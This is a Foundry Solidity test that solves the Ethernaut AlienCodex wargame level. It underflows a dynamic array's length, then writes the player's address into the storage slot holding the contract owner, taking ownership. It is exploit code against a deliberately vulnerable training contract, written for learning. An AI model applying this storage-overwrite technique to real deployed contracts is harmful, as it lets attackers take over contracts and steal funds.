// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function make_contact() external;

    function retract() external;

    function revise(uint256, bytes32) external;
}

contract AlienCodexTest is Test {
    address player;

    function setUp() public {
        player = makeAddr("PLAYER");
    }

    function test_AlienCodex() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------

        // AlienCodex contract cannot compile at higher than solidity 0.5
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("../src/levels:AlienCodex")
        );
        address target;
        assembly {
            target := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        vm.label(target, "AlienCodex");

        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.startPrank(player);

        IAlienCodex(target).make_contact();
        /*
         Arithmetic underflow occurs, codex.length becomes (2**256 - 1)

         From solidity 0.6, access to length of array is read-only
         It is no longer possible to assign a new value to their length

         From solidity 0.8, arithmetic opertaions revert on undeflow/overflow
         */
        IAlienCodex(target).retract();

        // codex[0] stored at slot keccak256(1), codex[1] at slot keccak256(1)+1 and so on.
        uint256 index = type(uint256).max -
            uint256(keccak256(abi.encodePacked(uint256(1)))) +
            1;
        IAlienCodex(target).revise(index, bytes32(uint256(uint160(player))));

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        assertEq(IAlienCodex(target).owner(), player);
    }
}
